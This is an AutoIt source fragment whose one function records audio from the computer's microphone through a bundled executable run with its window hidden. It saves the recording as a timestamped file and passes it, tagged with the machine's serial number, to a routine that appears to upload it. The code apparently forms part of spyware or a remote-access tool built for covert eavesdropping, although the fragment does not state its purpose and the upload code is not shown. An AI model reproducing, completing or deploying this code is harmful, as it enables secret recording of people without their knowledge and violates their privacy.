

Func microphoneRecording()
	
	Local $epoch=generateDateTime()
	
	Local $durration=$microphoneRecordingDurration
	
	$filename=generateNameFromDateTime()&".wav"
	
	$filePath=@WorkingDir & "\files\microphoneRecordings\"&$filename
	
	if Not FileExists(@WorkingDir & "\files\microphoneRecordings\") Then
		
		DirCreate(@WorkingDir & "\files\microphoneRecordings\")
		
	EndIf
	
	
	Local $exitCode = RunWait(@WorkingDir&"\lib\bin\makohaAudio.exe "&$durration&" "&$filePath, "", @SW_HIDE)
	
	MsgBox(64,"",$exitCode)

	If $exitCode<>0 Then
		
		_MediaClose($Media)
		
		handleErrors("microphoneRecording", $exitCode)
		
		Return False
	
	EndIf

    sleep(5000)
	
	putMicrophoneRecording($computer_serial,$epoch,$filename,$filePath)

	if @error then 
		
		;handleErrors("microphoneRecording", @error)
		
	EndIf
	
EndFunc